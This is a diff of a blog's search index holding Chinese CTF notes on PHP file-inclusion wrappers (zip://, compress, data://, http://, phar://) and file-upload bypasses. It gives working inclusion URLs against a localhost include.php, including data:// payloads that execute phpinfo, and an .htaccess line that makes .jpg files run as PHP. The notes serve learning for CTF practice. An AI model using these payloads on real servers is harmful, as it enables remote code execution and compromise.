+<li><p><strong>示例</strong>：</p>
+<ol>
+<li><p><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23）</p>
+<p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>
+<pre><code class="highlight http">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</code></pre>
+
+<p><img src="https://segmentfault.com/img/bVbrQBj" alt="图片描述"></p>
+</li>
+<li><p><code>compress.bzip2://file.bz2</code></p>
+<p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p>
+<pre><code class="highlight http">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</code></pre>
+
+<p><img src="https://segmentfault.com/img/bVbrQBt" alt="图片描述"></p>
+</li>
+<li><p><code>compress.zlib://file.gz</code></p>
+<p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p>
+<pre><code class="highlight http">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</code></pre>
+
+<p><img src="https://segmentfault.com/img/bVbrQBu" alt="图片描述"></p>
+</li>
+</ol>
+</li>
+<li><p><strong>参考</strong>：<a href="https://link.segmentfault.com/?enc=w0uak4RdRJUStEHdEK6h4w==.xhWZ9YsBZncXK/YcM6ZNJ5Jey44TQSRRDG2PDhW+VOCrc/wcHb6xJoP7Fff88EcMBe0t2zuSqAZeW77CzMA4ZQ==">http://php.net/manual/zh/wrappers.compression.php</a></p>
+</li>
+</ul>
+<h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data:// 协议"></a><code>data://</code> 协议</h3><ul>
+<li><p><strong>条件</strong>：</p>
+<ul>
+<li><code>allow_url_fopen</code>:on</li>
+<li><code>allow_url_include</code> :on</li>
+</ul>
+</li>
+<li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
+</li>
+<li><p><strong>用法</strong>：</p>
+<pre><code class="highlight dts"><span class="symbol">data:</span><span class="comment">//text/plain,</span>
+<span class="symbol">data:</span><span class="comment">//text/plain;base64,</span></code></pre>
+</li>
+<li><p><strong>示例</strong>：</p>
+<ol>
+<li><p><code>data://text/plain,</code></p>
+<pre><code class="highlight http">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code></pre>
+
+<p><img src="https://segmentfault.com/img/bVbrQBB" alt="图片描述"></p>
+</li>
+<li><p><code>data://text/plain;base64,</code></p>
+<pre><code class="highlight http">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre>
+
+<p><img src="https://segmentfault.com/img/bVbrQBD" alt="图片描述"></p>
+</li>
+</ol>
+</li>
+</ul>
+<h3 id="http-https-协议"><a href="#http-https-协议" class="headerlink" title="http:// &amp; https:// 协议"></a><code>http:// &amp; https://</code> 协议</h3><ul>
+<li><p><strong>条件</strong>：</p>
+<ul>
+<li><code>allow_url_fopen</code>:on</li>
+<li><code>allow_url_include</code> :on</li>
+</ul>
+</li>
+<li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p>
+</li>
+<li><p><strong>用法</strong>：</p>
+<pre><code class="highlight dts"><span class="symbol">http:</span><span class="comment">//example.com</span>
+<span class="symbol">http:</span><span class="comment">//example.com/file.php?var1=val1&amp;var2=val2</span>
+<span class="symbol">http:</span><span class="comment">//user:password@example.com</span>
+<span class="symbol">https:</span><span class="comment">//example.com</span>
+<span class="symbol">https:</span><span class="comment">//example.com/file.php?var1=val1&amp;var2=val2</span>
+<span class="symbol">https:</span><span class="comment">//user:password@example.com</span></code></pre>
+</li>
+<li><p><strong>示例</strong>：</p>
+<pre><code class="highlight http">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre>
+
+<p><img src="https://segmentfault.com/img/bVbrQBP" alt="图片描述"></p>
+</li>
+</ul>
+<h3 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:// 协议"></a><code>phar://</code> 协议</h3><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p>
+<pre><code class="highlight http">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></pre>
+
+<p><img src="https://segmentfault.com/img/bVbrQBX" alt="图片描述"></p>
+<p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar:&#x2F;&#x2F;协议对象注入技术</strong>。</p>
+<p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p>
+]]></content>
       <tags>
         <tag>CTF Web</tag>
       </tags>
@@ -1379,6 +2112,21 @@ if __name__ == &quot;__main__&quot;:
       </categories>
       <tags>
         <tag>智能合约</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传漏洞</title>
+    <url>/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>题型：</p>
+<p>弱判断:bp改一下就能过</p>
+<p>增加文件头</p>
+<p>改phtml绕过</p>
+<p>利用.user.ini配置文件或者.htaccess配合攻击(必须用特定文件后缀名时)</p>
+<p>.htaccess：内容如下（功能是将.jpeg文件解析为php文件）：</p>
+<pre><code class="highlight plaintext">AddType application/x-httpd-php .jpg</code></pre>
+]]></content>
+      <tags>
+        <tag>-CTF -Web</tag>
       </tags>
   </entry>
 </search>
